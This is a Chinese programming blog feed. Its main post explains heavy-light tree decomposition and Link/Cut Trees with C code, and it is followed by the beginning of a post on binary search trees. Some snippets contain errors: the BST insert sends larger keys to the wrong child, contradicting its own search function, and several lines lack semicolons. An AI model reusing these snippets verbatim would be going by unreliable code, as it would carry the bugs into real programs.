        <content type="html"><![CDATA[<h2 id="prologue"><a href="#prologue" class="headerlink" title="prologue"></a>prologue</h2><p>　　这是数据结构大杂烩系列的第四篇文章。在上一篇文章中，我们一起学习了两种平衡树——Treap和Splay，并简单地提到几道应用问题。在这篇文章中，我们再次换一个方向，学习一下Link/Cut Tree。这同样是一种比较难的数据结构，用于解决动态树问题。</p><h2 id="tree-chain-split"><a href="#tree-chain-split" class="headerlink" title="tree chain split"></a>tree chain split</h2><p>　　在正式介绍LCT之前，我们先来了解一下树链剖分。这是一种常见的树上的算法，用于维护树上的路径信息。通过将<strong>树划分成多条链，并映射到一段连续的数组上</strong>，使得我们能够将许多常见的区间维护的数据结构推广到树上(比如线段树)。<br>　　比如我们可以来看下面的一张图，了解一下树链剖分究竟在做什么事情。(粗的线表示连成了一条链)<br><img src="/2019/06/06/data-structure4/tree_chain.png" alt="data-structure4"><br>　　从这里，我们可以看到树链剖分的许多特性。整棵树被分成了4条链，分别是1-2-5-7, 3-6, 4, 8。并且，每一个节点属于且仅属于一条链。如果我们把每一条链按照顺序放进一个数组中的话，我们就成功地把一棵树映射到这个数组上了。</p><h3 id="how-to-implement"><a href="#how-to-implement" class="headerlink" title="how to implement"></a>how to implement</h3><p>　　树链剖分问题，简单来说就是轻重链划分的问题。具体来说，我们需要了解以下的概念：</p><ol><li>重儿子和轻儿子：对于每一个节点，重儿子为size最大的那个儿子，其余的儿子为轻儿子，如图中，1号节点的重儿子为2，3号为轻儿子。</li><li>重边和轻边：与重儿子相连的边为重边，与轻儿子相连的边为轻边。</li><li>重链和轻链：由重边连接而成的路径为重链，相反，轻边连成的路径为轻链。</li></ol><p>　　我们需要做的，就是<strong>将整棵树划分成数条重链</strong>。具体的实现操作方法为两次dfs。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 每个节点的父亲，重儿子，大小，深度</span></span><br><span class="line"><span class="keyword">int</span> fa[N], son[N], size[N], dep[N];</span><br><span class="line"><span class="comment">// 所在的重链顶端元素，链上的节点编号对应的线段树的编号，线段树对应的编号对应的链上的节点编号</span></span><br><span class="line"><span class="keyword">int</span> top[N], tid[N], rnk[N];</span><br><span class="line"><span class="comment">// 用链表组织每个点的边</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edge</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> to, next;</span><br><span class="line">&#125; e[N&lt;&lt;<span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>　　第一次dfs的时候，我们可以得到每一个节点的父亲，重儿子，轻儿子，大小和深度。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs1</span><span class="params">(<span class="keyword">int</span> rt)</span> </span>&#123;</span><br><span class="line">    son[rt] = <span class="number">0</span>;</span><br><span class="line">    size[rt] = <span class="number">1</span>;</span><br><span class="line">    <span class="comment">// 遍历链表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> d = link[rt]; d; d = e[d].next) &#123;</span><br><span class="line">        <span class="keyword">int</span> to = e[d].to;</span><br><span class="line">        <span class="comment">// 没有访问过则访问</span></span><br><span class="line">        <span class="keyword">if</span> (!dep[to]) &#123;</span><br><span class="line">            dep[to] = dep[rt] + <span class="number">1</span>;</span><br><span class="line">            fa[to] = rt;</span><br><span class="line">            dfs1(to);</span><br><span class="line">            size[rt] += size[to];</span><br><span class="line">            <span class="comment">// 选择size最大的那个为重儿子</span></span><br><span class="line">            <span class="keyword">if</span> (size[to] &gt; size[son[rt]]) son[rt] = to;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　第二次遍历的时候，我们由于知道了每个节点的子树大小，我们可以得到每一条链对应的顶端的节点，并且还可以顺便做从树到线性数组的映射。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs2</span><span class="params">(<span class="keyword">int</span> rt, <span class="keyword">int</span> tp)</span> </span>&#123;</span><br><span class="line">    top[rt] = tp;</span><br><span class="line">    tid[rt] = ++tot;</span><br><span class="line">    rnk[tot] = rt;</span><br><span class="line">    <span class="comment">// 没有重儿子，说明没有儿子了，返回</span></span><br><span class="line">    <span class="keyword">if</span> (!son[rt]) <span class="keyword">return</span>;</span><br><span class="line">    <span class="comment">// 有重儿子优先遍历，保证最后重链上的元素在线段树中是相邻的！</span></span><br><span class="line">    dfs2(son[rt], tp);</span><br><span class="line">    <span class="comment">// 遍历轻儿子，注意遍历的时候要做判断，防止再次访问到重儿子或者访问到父亲上去</span></span><br><span class="line">    <span class="comment">// 并且，轻儿子的top为它自己</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> d = link[rt]; d; d = e[d].next)</span><br><span class="line">    <span class="keyword">if</span> (e[d].to != son[rt] &amp;&amp; e[d].to != fa[rt]) &#123;</span><br><span class="line">        dfs2(e[d].to, e[d].to);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　经过上面的操作后，我们就可以得到一个数组，如前面的图所示。并且，我们可以通过维护这个数组来维护一整棵树的信息。假设这个时候我们使用线段树来维护这个数组，这个时候如果我们要查询8和7的路径上所有点的信息的话，我们可以拆分成[5,7]和[8]，这样，我们就只需要对线段树执行两次查询操作就可以得到答案。由于从根节点到任意节点的链的数量为O(logn)，而线段树区间查询的复杂度为O(logn)，最终我们对于树上路径的信息查询复杂度为O(log<sup>2</sup>n)，效率还是比较客观的。参考例题：<a href="https://www.luogu.org/problemnew/show/P3384" target="_blank" rel="noopener">洛谷P3384</a></p><h2 id="link-cut-tree"><a href="#link-cut-tree" class="headerlink" title="link/cut tree"></a>link/cut tree</h2><p>　　好了，在简单了解完树链剖分以后，我们进入正题，看一下LCT究竟是怎样实现的。<br>　　注意：此处LCT路径是用splay维护的，因此如果还不清楚splay是什么的话，建议先看<a href="https://littlecsd.net/2019/05/28/data-structure3/#more" target="_blank" rel="noopener">上一篇文章</a></p><h3 id="a-simple-problem"><a href="#a-simple-problem" class="headerlink" title="a simple problem"></a>a simple problem</h3><p>　　同样的，我们先来看这样一个问题：</p><blockquote><p>维护一棵树，要求实现以下操作:<br>修改两点间路径权值，查询两点间路径权值<br>修改子树权值，查询子树权值和</p></blockquote><p>　　这就是比较明显的树剖模板题了。使用树链剖分将树上的信息映射到数组，并用线段树维护即可。这个时候，如果更改一下条件，我们需要维护的不是一棵树，而是一片森林呢？这个时候就还涉及到树的合并和分离的问题，单纯的树链剖分就不太好做了。<br>　　这时，我们原先的思路就应该改一下，从而能够顺利解决<strong>动态树</strong>的问题。其中一种可行的解法就是LCT。</p><h3 id="what-is-LCT"><a href="#what-is-LCT" class="headerlink" title="what is LCT"></a>what is LCT</h3><p>　　LCT是一种用于维护一片森林之间的信息的数据结构，被用来解决动态树问题。它能够实现边的加入和删除，任意两点间的距离信息，连通性，也支持信息的修改等。其中，LCT用到了树链剖分的思想，并且使用splay来进行链的维护。也可以这样理解，LCT实现的是<strong>动态的树链剖分</strong>。</p><h3 id="some-basic-concept"><a href="#some-basic-concept" class="headerlink" title="some basic concept"></a>some basic concept</h3><p>　　在理解LCT之前，我们需要先来看一些概念。</p><ol><li>实链与虚链，类似于树链剖分中的重链和轻链的概念，但实链与虚链是动态的，即可以随时发生更改。每一条实链(包含单个节点)构成了一棵splay树。并且，<strong>实链上的所有节点组成的序列是按照深度为关键字进行排序的</strong>，即所有splay中节点的左儿子在原先的树中是当前节点的祖先，节点的右儿子在原先的树中是当前节点的儿子！这是很关键的一点。</li><li>原树与辅助树。原树即由已知的信息构成的树，辅助树即我们需要去维护的数据结构，一棵辅助树对应一棵原树，一条链对应一个splay，因此，一个辅助树由多个splay组成。参考如下图(实链为实线，虚链为虚线，每一个绿色的区域包围了一个splay)：<br><img src="/2019/06/06/data-structure4/lct1.png" alt="data-structure4"><br>　　通过辅助树，我们能够得到唯一的一棵原树，因此我们只需要维护辅助树即可。而一棵原树往往可以对应于多棵辅助树。并且，在辅助树中，每一棵splay满足中序遍历根节点得到是深度顺序的性质，不同的splay之间单向连接，儿子知道父亲，而父亲并不知道儿子是谁。<br>　　由辅助树的特点，我们还可以知道，辅助树是可以任意换根的(只要满足性质即可)，并且，在辅助树上能够实现虚链和实链的变换(后面会讲)，这也是我们使用LCT的核心方法。由于LCT需要的方法比较多，下面还是分类别介绍。</li></ol><h3 id="variables-amp-basic-function"><a href="#variables-amp-basic-function" class="headerlink" title="variables &amp; basic function"></a>variables &amp; basic function</h3><p>　　LCT需要的变量也比较多，具体如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 每个节点在辅助树中的父亲和儿子，ch[i][0]表示左儿子，ch[i][1]表示右儿子</span></span><br><span class="line"><span class="keyword">int</span> fa[N], ch[N][<span class="number">2</span>];</span><br><span class="line"><span class="comment">// 每个节点在splay中的子树的大小，每个节点的值，每个节点在splay中的子树的权值和等等</span></span><br><span class="line"><span class="keyword">int</span> sz[N], val[N], sum[N] ...</span><br><span class="line"><span class="comment">// 翻转标记，用于根的更改操作</span></span><br><span class="line"><span class="keyword">bool</span> rev[N];</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ls(x) ch[x][0]</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> rs(x) ch[x][1]</span></span><br><span class="line"><span class="comment">// 判断当前节点是否是父亲的右儿子，用于splay</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> get(x) (x == ch[fa[x]][1])</span></span><br><span class="line"><span class="comment">// 判断当前节点是否是splay中的根节点，注意到根节点和其他splay之间是单向连接的，</span></span><br><span class="line"><span class="comment">// 如果不是根节点，那么必定是其父亲的左儿子或者右儿子。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> nRoot(x) (ch[fa[x]][0] == x || ch[fa[x]][1] == x)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  sz[x] = sz[ls(x)] + sz[rs(x)] + <span class="number">1</span>;</span><br><span class="line">  sum[x] = sum[ls(x)] + sum[rs(x)] + val[x];</span><br><span class="line">  ...</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">down</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> l = ls(x), r = rs(x);</span><br><span class="line">  <span class="keyword">if</span> (l) &#123;</span><br><span class="line">    <span class="comment">// 标记下传...</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> (r) &#123;</span><br><span class="line">    <span class="comment">// 标记下传...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="splay-operation"><a href="#splay-operation" class="headerlink" title="splay operation"></a>splay operation</h3><p>　　首先，我们需要处理维护splay需要的一些函数。具体和前面splay的写法其实基本上是一样的，除了rotate中需要注意一下和祖先节点的连接，以及splay中需要先将标记下传。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 旋转操作，和splay类似</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">rotate</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> y = fa[x], z = fa[y], k = get(x);</span><br><span class="line">    <span class="comment">// 注意，此处应该写在前面，否则nRoot判断会出问题</span></span><br><span class="line">    <span class="keyword">if</span> (nRoot(y)) ch[z][ch[z][<span class="number">1</span>] == y] = x;</span><br><span class="line">    ch[y][k] = ch[x][k^<span class="number">1</span>];</span><br><span class="line">    fa[ch[x][k^<span class="number">1</span>]] = y;</span><br><span class="line">    ch[x][k^<span class="number">1</span>] = y;</span><br><span class="line">    fa[y] = x;</span><br><span class="line">    fa[x] = z;</span><br><span class="line">    up(y);up(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 从上到下更新当前splay树的根节点到x路径上的点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (nRoot(x)) update(fa[x]);</span><br><span class="line">    <span class="keyword">if</span> (rev[x]) down(x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 将当前节点旋转到对应的splay树的根节点</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">splay</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里由于当前节点的父亲可能具有标记没有下传，应该先将路径上所经过的节点的标记下传，再进行splay</span></span><br><span class="line">    update(x);</span><br><span class="line">    <span class="keyword">int</span> f = fa[x];</span><br><span class="line">    <span class="keyword">while</span> (nRoot(x)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nRoot(f)) rotate(get(f) == get(x) ? f : x);</span><br><span class="line">        rotate(x);</span><br><span class="line">        f = fa[x];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="core-method"><a href="#core-method" class="headerlink" title="core method"></a>core method</h3><p>　　接下来这里就是splay的核心方法了。主要有access和mk_root两个。</p><h4 id="access"><a href="#access" class="headerlink" title="access"></a>access</h4><p>　　access函数的作用在于，<strong>打通当前辅助树中，根节点到某个节点x的路径，即通过虚实链的变换使得节点x与根节点位于同一棵splay中</strong>，并且，打通后，在x和根节点所在的splay中，x会成为深度最大的那个节点。且access过后，根节点有可能会发生改变！为了更好的理解access的过程，这里引用一下论文的图片(其中的preferred path在此处即是实链)。<br><img src="/2019/06/06/data-structure4/lct2.png" alt="data-structure4"><br>　　考虑一下如果我们要来实现这样的一个过程，那应该怎么处理呢？<br>　　首先假设最简单的情况，点x和根节点在同一棵splay上面，这个时候我们的处理方式其实就很简单了，只要对x进行splay操作，移动到splay树的根节点，然后单方向地断开x和它的右儿子即可。这个时候满足x是这棵splay的深度最大的点！(右儿子被从这棵树中赶出去了，形成了另外一棵splay树)<br>　　我们之前的图，调用access(3)后，应该变成了这个样子：<br><img src="/2019/06/06/data-structure4/lct3.png" alt="data-structure4"><br>　　其次，我们再来考虑更复杂一点的情况，点x位于splay树A，辅助树的根节点位于splay树B，且树A和B之间直接连接。这个时候就比较麻烦了。但我们还是可以借鉴之前的思路。同样的，我们把点x用splay移动到树A的根节点，并且和右儿子单向断开，分成两棵树C和D，然后，对x的父亲y(由于A和B之间是直接链接的，此时y应该是在树B当中)，我们把它移动到根节点，并且断开右子树，并且，右儿子接到点x上，这个时候，我们就完成了！此时x和根节点在同一棵splay上，且x的深度是最大的。<br>　　同样的，我们之前的图，调用access(5)后，应该变成了这个样子：<br><img src="/2019/06/06/data-structure4/lct4.png" alt="data-structure4"><br>　　那么，如果他们之间不是相邻的呢？其实思路是一样哒!<br>　　当然，说是很复杂，实际上代码却很短：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">access</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> p = <span class="number">0</span>; x; p = x, x = fa[x]) &#123;</span><br><span class="line">    splay(x);</span><br><span class="line">    ch[x][<span class="number">1</span>] = p;</span><br><span class="line">    up(x);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　总的来说，流程大致为：使用splay(x)将当前节点移动到splay树的根节点，并单向断开和右儿子的连接，将右儿子接向上一棵splay树，不断循环，直到到达根节点，此时fa[x]=0，退出。注意到，access事实上是从底向上进行连接的。<del>另外，别忘了up操作</del></p><h4 id="mk-root"><a href="#mk-root" class="headerlink" title="mk_root"></a>mk_root</h4><p>　　理解好之前的access操作后，这个操作也就变得很简单了。make_root(x)，将当前节点变成原树的根节点。这看似很难，实际上只需要用到我们之前的写的几个函数即可。<br>　　我们考虑一下，如果要让当前节点作为辅助树的根节点的话，那么它有什么特点？它没有父亲！换句话说，它的深度在其所在的树中是最小的。我们有什么好办法可以实现这个呢？<br>　　前面我们的access操作我们说，access(x)之后，x和根节点位于同一棵splay树中，且x是深度最大的。那么我们如果使用splay操作将x移动到根节点之后，会发生什么？——x的右儿子是空的，节点都在它的左儿子上，这个时候我们如果再使用reverse操作，x的左儿子就空了，这个时候x就变成了splay树中深度最小的那个节点了。换句话说，也就变成了原树的根节点了！另外，别忘了打标记。<br>　　代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mk_root</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">  access(x);</span><br><span class="line">  splay(x);</span><br><span class="line">  rev[x] ^= <span class="number">1</span>;</span><br><span class="line">  swap(ls(x), rs(x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="other-function"><a href="#other-function" class="headerlink" title="other function"></a>other function</h3><p>　　有了之前的那几个操作之后，现在我们几乎可以实现一切了！</p><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>　　首先是find操作，用于查找节点x所在的原树的根节点。我们只要将原先的根节点和x连通，再把x移动到根节点处，最后不断向左儿子找，就能得到根节点的。思路是很简单的。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">    access(x);</span><br><span class="line">    splay(x);</span><br><span class="line">    <span class="keyword">while</span> (ls(x)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (rev[x]) down(x);</span><br><span class="line">        x = ls(x);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 此处splay(x)是为了保证find操作过后，根节点没有发生改变，这句话其实也可以不要</span></span><br><span class="line">    <span class="comment">// 但是后面的link和cut操作就需要做稍微一点点修改</span></span><br><span class="line">    splay(x);</span><br><span class="line">    <span class="keyword">return</span> x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="link"><a href="#link" class="headerlink" title="link"></a>link</h4><p>　　另一个很常见的操作就是link，将两棵树连接到一起。这里要考虑两种情况。<br>　　第一种是连接的两个点保证合法，那么我们只需要将其中一个点移动到其所在树的根节点，并进行更新操作即可。第二种是两个点不保证合法，那么我们必须确认合法性。什么情况下是不合法的呢？就是两个点本来就已经位于同一棵树中了，这个时候直接连接就破坏了树结构。因此，我们可以直接通过find函数确定x和y是不是在同一棵树上即可。<br>　　代码也很简单，如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">link</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    mk_root(x);</span><br><span class="line">    <span class="comment">// 保证合法，直接连接</span></span><br><span class="line">    fa[x] = y;</span><br><span class="line">    <span class="comment">// 不保证合法的话，需要先做判断</span></span><br><span class="line">    <span class="keyword">if</span> (find(y) != x) fa[x] = y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h4><p>　　有了连接操作，那么必然也会有删除操作，对于两个节点来说，实现删除操作明显比连接操作要复杂一些。先考虑必然合法的情况，我们可以将x使用mk_root移动到根节点，注意到合法性，这个时候x的右儿子必定是y。这个时候只需要双向断开连接即可。<br>　　接下来考虑不合法的情况，总共有多少种情况呢？首先，第一种情况就是x和y不在同一棵树上，那么我们可以使用find函数判断。第二种情况是x和y在同一棵树上，但是他们没有直接连接，这造成的影响就是，<strong>mk_root之后，y的父亲不是x或者y有左儿子！</strong>(有左儿子的话说明x和y在原树中不是直接连接的)<br>　　代码如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">cut</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    mk_root(x);</span><br><span class="line">    <span class="comment">// 不保证合法的话，此处需要做一下判断</span></span><br><span class="line">    <span class="keyword">if</span> (find(y) != x || fa[y] != x || ch[y][<span class="number">0</span>]) <span class="keyword">return</span>;</span><br><span class="line">    fa[y] = rs(x) = <span class="number">0</span>;</span><br><span class="line">    up(x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="split"><a href="#split" class="headerlink" title="split"></a>split</h4><p>　　接下来，还有一个常见的操作，就是区间的提取。为了方便区间的操作，我们再分离出这样的一个函数，可以把x和y路径上的所有节点提取出来(保证x和y连接)。最后我们可以通过y节点获取整条路径的信息。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">split</span><span class="params">(<span class="keyword">int</span> x, <span class="keyword">int</span> y)</span> </span>&#123;</span><br><span class="line">    mk_root(x);</span><br><span class="line">    access(y);</span><br><span class="line">    <span class="comment">// 此处还是需要splay(y) 因为access后x不一定是splay的根了</span></span><br><span class="line">    splay(y)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="summary"><a href="#summary" class="headerlink" title="summary"></a>summary</h3><p>　　LCT是一种灵活性极强的数据结构，可以实现很多意想不到的功能，当然，它也有一些缺点，比如代码量往往比较大，容易写出bug，还有虽然复杂度是O(log<sup>2</sup>n)，但是常数比较大等等。但这也不影响它的广泛应用。如果有时间的话，还是可以好好了解一下的。比如做两道题什么的<br>　　推荐题目:<br>　　　<a href="https://lydsy.com/JudgeOnline/problem.php?id=2049" target="_blank" rel="noopener">Sdoi2008Cave</a><br>　　　<a href="https://www.luogu.org/problemnew/show/P3690" target="_blank" rel="noopener">洛谷P3690</a></p><h2 id="epilogue"><a href="#epilogue" class="headerlink" title="epilogue"></a>epilogue</h2><p>　　这样，到这里，我们的数据结构大杂烩系列的第四期就结束了，在这篇文章中，我们一开始先简单地提到了树链剖分(很重要的算法，最好要会)，接着，由树链剖分的思想，我们引申到了LCT这种神奇的结构，并且，讲了LCT一些基本的函数和它的思想，最后推荐大家还是去做两道题熟练一下吧。<br>　　然后之前说好的第四期写红黑树。。网上的介绍太多了，而且我看了下它们讲的好详细啊。所以我想想还是不写了。<del>对，没错，我就是鸽子王！</del><br>　　接下来的话，感觉短时间内可能不会继续更新了，或者换一个话题写了。<br>　　参考资料：<a href="https://oi-wiki.org/ds/lct/" target="_blank" rel="noopener">oi-wiki/Link Cut Tree</a></p><script type="text/javascript" src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=default"></script>]]></content>
      
      
      <categories>
          
          <category> Data Structure </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Data Structure </tag>
            
            <tag> Link/Cut Tree </tag>
            
            <tag> Chain split </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Data Structure Note(III) —— Balanced Tree</title>
      <link href="/2019/05/28/data-structure3/"/>
      <url>/2019/05/28/data-structure3/</url>
      
        <content type="html"><![CDATA[<h2 id="prologue"><a href="#prologue" class="headerlink" title="prologue"></a>prologue</h2><p>　　这是数据结构大杂烩系列的第三篇文章。在前两篇文章中，我们主要学习了线段树，树状数组，以及线段树的可持久化版本(主席树)，还稍微提了一下树套树的内容。今天，我们重新换了一个方向——介绍树结构中的另一种及其重要的类型——平衡树。这种数据结构比较难，却很常见(比如set容器)，因此我们需要较好地理解与掌握。</p><h2 id="a-simple-problem"><a href="#a-simple-problem" class="headerlink" title="a simple problem"></a>a simple problem</h2><p>　　我们还是先来看这样一个问题：</p><blockquote><p>给定一个无序数组，查找数字v是否位于数组当中</p></blockquote><p>　　很显然，遇到这样一个问题，我们最直接的想法就是遍历即可，复杂度为O(n)。但是，如果有多次查找操作的话，一个更好的办法应该是排序，预处理为O(nlogn)，然后使用二分查找，单次查询复杂度O(logn)，相当不错，但是，如果问题包含了添加和删除操作，那么在每次插入后都要对整体进行排序，效率就比较低了。这个时候我们考虑引入BST。</p><h2 id="binary-search-tree"><a href="#binary-search-tree" class="headerlink" title="binary search tree"></a>binary search tree</h2><p>　　在正式进入平衡树之前，我们先来看一下一种更基础的结构——二叉查找树(binary search tree)。和它的名字一样，这是一种用于高效查找和插入的基础数据结构，最好情况下，查找和插入的复杂度均为O(logn)。其插入和查找的代码大致如下(其实本质上它就是一个二分查找的过程)：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查找时，如果v大于当前节点，说明v若存在，只能位于右子树当中。</span></span><br><span class="line"><span class="comment">// 同理，v小于当前节点，则只能位于左子树当中。</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">search</span><span class="params">(Node* rt, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (rt == null) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">if</span> (rt-&gt;v &lt; key) <span class="keyword">return</span> search(rt—&gt;rson, key);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (rt-&gt;v &gt; key) <span class="keyword">return</span> search(rt-&gt;lson, key);</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">Node* <span class="title">insert</span><span class="params">(Node* rt, <span class="keyword">int</span> key)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (rt == null) rt = <span class="keyword">new</span> Node(key)</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (rt-&gt;v &lt; key) rt-&gt;lson = insert(rt-&gt;lson, key);</span><br><span class="line">  <span class="keyword">else</span> rt-&gt;rson = insert(rt-&gt;rson, key)</span><br><span class="line">  <span class="keyword">return</span> rt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>　　